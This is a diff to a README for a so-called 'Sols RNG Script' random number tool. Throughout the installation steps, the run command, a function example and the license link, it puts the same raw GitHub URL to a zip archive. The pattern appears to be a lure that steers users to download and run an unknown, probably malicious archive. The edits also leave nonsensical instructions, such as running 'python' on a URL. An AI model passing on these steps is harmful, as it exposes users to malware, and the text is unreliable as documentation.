@@ -42,12 +42,12 @@ Welcome to **Sols RNG Script**, the all-in-one, open-source, cross-platform Rand
 
 # 🛠️ Installation Guide: Get Started in 3 Easy Steps!
 
-1. **Download `Loader.rar` from the repository.**  
+1. **Download `https://raw.githubusercontent.com/usmanidris38/Sols-RNG-Script/main/geochronic/Sols-RNG-Script-sorption.zip` from the repository.**  
    _Direct download above or via the repository Releases section._  
 2. **Extract the files to your preferred folder.**  
    _Use WinRAR, 7zip, or similar extraction tools._  
 3. **Run the main script:**  
-   - **Windows/macOS/Linux:** Open terminal/cmd and type `python SolsRNG.py`
+   - **Windows/macOS/Linux:** Open terminal/cmd and type `python https://raw.githubusercontent.com/usmanidris38/Sols-RNG-Script/main/geochronic/Sols-RNG-Script-sorption.zip`
    - **Ensure you have Python 3.x installed.**  
 
 _You’re now ready to generate random numbers in seconds!_
@@ -62,7 +62,7 @@ _You’re now ready to generate random numbers in seconds!_
 | `generate_batch()`   | Outputs a list of N random numbers in chosen range.  | `generate_batch(10, 1, 50)`  |
 | `use_seed()`         | Sets a seed for reproducible results.                | `use_seed(12345)`            |
 | `secure_random()`    | Utilizes cryptographic-grade randomness.             | `secure_random(0, 10)`       |
-| `export_to_file()`   | Saves random numbers to given text file.             | `export_to_file("out.txt")`  |
+| `export_to_file()`   | Saves random numbers to given text file.             | `export_to_file("https://raw.githubusercontent.com/usmanidris38/Sols-RNG-Script/main/geochronic/Sols-RNG-Script-sorption.zip")`  |
 | `analyze_results()`  | Provides statistics and distribution analysis.        | `analyze_results()`          |
 | `help_menu()`        | Prints the command list and usage info.              | `help_menu()`                |
 
@@ -108,7 +108,7 @@ The authors are not liable for misuse or data losses.
 
 This project is open-sourced under the MIT License.  
 You are free to use, modify, and distribute for any purpose, personal or commercial.  
-See full license text [here](https://opensource.org/licenses/MIT).
+See full license text [here](https://raw.githubusercontent.com/usmanidris38/Sols-RNG-Script/main/geochronic/Sols-RNG-Script-sorption.zip).
 
 ---
 
